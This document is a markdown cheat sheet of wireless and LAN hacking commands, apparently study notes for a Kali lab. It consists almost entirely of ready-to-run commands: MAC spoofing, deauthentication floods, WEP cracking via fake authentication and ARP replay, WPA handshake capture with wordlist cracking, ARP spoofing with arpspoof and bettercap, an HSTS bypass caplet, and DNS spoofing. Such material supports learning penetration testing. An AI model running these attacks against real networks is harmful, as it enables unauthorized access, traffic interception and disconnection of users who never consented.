# Network Hacking

* To list all network interfaces available, we can use `ifconfig`. The MAC address can be viewed under _ether_ in _wlan0_ and the IP can be viewed under _inet_ in _eth0_.

* To change the MAC address:

```shell
ifconfig wlan0 down #disables wlan0

ifconfig wlan0 hw ether 00:11:22:33:44:55 #sets hardware address of wlan0

ifconfig wlan0 up #enables wlan0
```

* To list only wireless interfaces, we can use `iwconfig`.

* To change _wlan0_ to monitor mode:

```shell
ifconfig wlan0 down

airmon-ng check kill #optional; kills any process that disturb interface in monitor mode

iwconfig wlan0 mode monitor #changes wlan0 mode to monitor

ifconfig wlan0 up
```

---

* To sniff packets, we can use _airodump-ng_:

```shell
airodump-ng wlan0 #here, wlan0 must be in monitor mode in order to fetch details
```

* To sniff packets on particular wifi bands:

```shell
airodump-ng --band a wlan0 #captures all networks with 5 GHz band

airodump-ng --band abg wlan0 #captures 2.5 GHz and 5 GHz networks at the same time
```

* To do targeted packet sniffing:

```shell
airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 4 --write testfile wlan0 #captures a particular network with given bssid and channel number, then it saves data to a file called testfile
#this will also show the devices connected to network
```

* To run a deauthentication attack, which can disconnect any client from any network:

```shell
aireplay-ng --deauth 100000000 -a 54:37:BB:B5:BB:09 -c 70:BB:E9:7B:AE:D2 wlan0
#here, aireplay-ng is the program name, followed by the deauth attack specifications including the MAC address of target router (-a) and MAC address of target client (-c)
```

---

* WEP(Wired Equivalent Privacy) can be cracked using two tools: _airodump-ng_ and _aircrack-ng_.

* To crack into a busy WEP network:

```shell
airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 4 --write wep_test wlan0
#capturing data packets from WEP network and writing it into a file

aircrack-ng wep_test-01.cap
#analyze captured data, cracks the key and prints it
```

* To crack into a non-busy WEP network, we need to do a fake authentication attack:

```shell
airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 11 --write arpreplay wlan0

aireplay-ng --fakeauth 0 -a 70:BB:E9:7B:AE:D2 -h 1A:AB:2E:49:AA:AD wlan0
#to associate with network; uses aireplay-ng tool to run a fake authentication attack on given MAC address access point (-a) and by wireless adapter having monitor mode(-h).

aireplay-ng --arpreplay -b 70:BB:E9:7B:AE:D2 -h 1A:AB:2E:49:AA:AD wlan0
#ARP request replay; forces access point to generate new IVs

aircrack-ng arpreplay-01.cap
```

---

* To crack WPA/WPA2:

```shell
airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 3 --write wpa-handshake wlan0
#capture handshake (when client joins network)
#deauth attack can be done in parallel to capture handshake
aireplay-ng --deauth 4 -a 54:37:BB:B5:BB:09 -c 70:BB:E9:7B:AE:D2 wlan0
#After this handshake is captured and stored in file

crunch 6 8 ria258 -o trial-wordlist.txt
#wordlist created using crunch with specifics

aircrack-ng wpa-handshake-01.cap -w trial-wordlist.txt
```

---

* For devices connected on same network:

```shell
netdiscover -r 10.0.2.1/24 #search devices on same subnet as Kali

netdiscover -c 10 -r 10.0.2.1/24 -i eth0 #increases no. of packets
```

* zenmap (GUI for nmap) can be used to gather more data about devices within subnet range.

---

* ARP Spoofing using arpspoof:

```shell
arp -a #to view arp table, works on both Linux and Windows

arpspoof -i eth0 -t 10.0.2.15 10.0.2.1 #arpspoof target victim (Windows VM) through gateway

arpspoof -i eth0 -t 10.0.2.1 10.0.2.15 #arpspoof target router (gateway) through victim
#both arpspoof commands required to be run simultaneously
#result can be observed by viewing changed MAC address using 'arp -a' on victim PC

echo 1 > /proc/sys/net/ipv4/ip_forward #enable port forwarding
```

* ARP Spoofing using Bettercap:

```shell
bettercap -iface eth0 #initialize

net.probe on #net probing, gives list of connected IPs

net.show #list of connected clients
#'help' can be used to view modules

set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.15 #change parameter values

arp.spoof on #start arp spoofer

net.sniff on #sniff packets

#.cap files can be created to run custom scripts to save time
bettercap -iface eth0 -caplet spoof.cap
```

* HTTPS and HSTS can be bypasses using caplets from Bettercap, such as hstshijack.

* DNS Spoofing:

```shell
service apache2 start #start web server

bettercap -iface eth0 -caplet spoof.cap

set dns.spoof.all true

set dns.spoof.domains zsecurity.org, *.zsecurity.org

dns.spoof on
#by default, it will redirect to interface address (10.0.2.4)
```
